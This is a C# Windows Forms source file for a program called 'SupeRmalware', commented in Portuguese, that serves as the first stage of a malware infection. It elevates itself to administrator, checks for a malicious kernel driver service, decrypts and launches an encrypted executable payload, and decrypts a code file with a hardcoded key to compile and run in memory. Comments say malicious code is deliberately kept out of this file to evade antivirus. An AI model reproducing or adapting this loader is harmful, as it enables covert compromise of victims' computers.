
/*
 *
 * Arquivo inicial, ele vai fazer a infecção do OS
 * 
*/

using InicialExe;
using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security.Cryptography.X509Certificates;
using System.Security.Principal;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SupeRmalware
{
    public partial class Form1 : Form
    {

        /*
            PS:
            Não podemos colocar código maliciso nesse arquivo, isso é necessário
            Para que o antivírus não impeça esse arquivo, e acabe com todas
            As possibilidades de continuar a infecção
        */

        /// <summary>
        /// Verifique se o programa foi executado como administrador
        /// </summary>
        private void Administrador()
        {
            // Novo indetificador
            WindowsIdentity wi = WindowsIdentity.GetCurrent();

            // Principal
            var wp = new WindowsPrincipal(wi);

            // Verifique se está rodando como administrador
            bool runAsAdmin = wp.IsInRole(
                WindowsBuiltInRole.Administrator // Administrador
            );

            // Se não estiver como administrador
            if (!runAsAdmin)
            {
                // Novo ProcessStartInfo
                ProcessStartInfo processInfo = new ProcessStartInfo(
                    // Local do antivírus
                    Assembly.GetExecutingAssembly().Location
                );

                // Configure para executar como administrador
                processInfo.UseShellExecute = true;
                processInfo.Verb = "runas";

                try
                {
                    // Inicie novamente, mas com direitos adminstrativos
                    Process.Start(processInfo);

                    // Saia do aplicativo
                    Environment.Exit(0);
                }
                catch (Exception)
                {
                    Environment.Exit(0); // Saia do aplicativo
                }

                // Saia do aplicativo
                Environment.Exit(0);
            }
        }

        /// <summary>
        /// Inicia tudo
        /// </summary>
        public Form1()
        {
            Administrador();

            try
            {
                // Novo serviço do driver
                ServiceController sv = new ServiceController("SupeRmalware Driver");

                // Ok, nosso serviço de kernel está rodando, HORA DE FAZER A BAGUNÇA :)
                if (sv.Status == ServiceControllerStatus.Running)
                {
                    // Pasta atual
                    string atual = Application.StartupPath;

                    // Descriptografe o malware que vai fazer a super bagunça
                    Encrypt.DecryptFile(atual + "\\mmnt.enc", atual + "\\mmnt.exe");

                    // Novo thread, vamos sair depois de executar o SupeRmalware
                    new Thread(() =>
                    {
                        // Programa descriptografado
                        Process.Start(atual + "\\mmnt.exe");

                        // Saia
                        Environment.Exit(0);
                    }).Start();
                }
            } catch (Exception) { }

            InitializeComponent();

            // Se o arquivo existir, significa que a 1 parte já foi concluida
            // Vamos continuar para a 2
            if (File.Exists("C:\\Windows\\bcEnabled"))
            {
                IniciarMmFuncao();
            }
        }

        /// <summary>
        /// Quando a checkbox foi marcada ou desmarcada
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox1.Checked == true)
            {
                iniciarMm.Enabled = true;
            } else
            {
                iniciarMm.Enabled = false;
            }
        }

        /// <summary>
        /// Chama uma mensagebox
        /// </summary>
        /// <param name="texto"></param>
        private void Mensagem(string texto)
        {
            MessageBox.Show(texto, "Erro", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }

        /// <summary>
        ///  Executa o código do TXT
        /// </summary>
        /// <param name="texto"></param>
        private void ExecutarCodigo(string texto)
        {
            try
            {
                // Novo CSharpCodeProvider
                CSharpCodeProvider codigoCSharp = new CSharpCodeProvider();

                // Novo compilador de parâmetros 
                CompilerParameters parametros = new CompilerParameters();

                // Referencias para que o código do texto seja executado
                parametros.ReferencedAssemblies.Add("System.IO.dll");
                parametros.ReferencedAssemblies.Add("System.dll");

                // Gere o código na memória
                parametros.GenerateInMemory = true;

                // Resultados
                CompilerResults resultados =

                    // Compilar apartir do texto
                    codigoCSharp.CompileAssemblyFromSource(

                        // Os parâmetros
                        parametros,

                        // Código fonte
                        texto
                );

                // Se houver algum erro no código
                if (resultados.Errors.HasErrors)
                {
                    Mensagem("Opa, ocorreu um erro ao tentar executar um arquivo necessário, tente novamente.");

                    // Falhou em algo...
                    // Independente do que seja, não podemos continuar
                    Environment.Exit(0);
                }

                // Novo Assembly
                Assembly assembly = resultados.CompiledAssembly;

                // Obtenha a classe do arquivo, exemplo: namespace First, depois dele
                // O Program {}
                Type programa = assembly.GetType("First.Program");

                // Função inicial que será chamada
                MethodInfo main = programa.GetMethod("Main");

                // Agora, vamos executar o código
                main.Invoke(null, null);
            } catch (Exception)
            {
                // Ocorreu um erro, devemos parar
                Mensagem("Opa, ocorreu um erro ao tentar executar um arquivo necessário, tente novamente.");

                Environment.Exit(0);
            }
        }

        /// <summary>
        /// Inicia o mm
        /// </summary>
        private void IniciarMmFuncao()
        {
            // Só mais uma medida de proteção
            if (checkBox1.Checked == false)
                return;

            // Código para executar
            string codigoExecutar = File.ReadAllText(Application.StartupPath + "\\code.txt");

            // Execute o código do seguinte texto
            ExecutarCodigo(Encrypt.DecryptString(codigoExecutar, "dimas123"));

            MessageBox.Show("Sucesso! Para continuar a instação, você precisa reiniciar o computador, estaremos esperando ;)", "Falta somente uma coisa", MessageBoxButtons.OK, MessageBoxIcon.Information);

            Environment.Exit(0);
        }

        /// <summary>
        /// Quando clicar no botão de iniciar mm
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void iniciarMm_Click(object sender, EventArgs e)
        {
            IniciarMmFuncao();
        }

    }
}
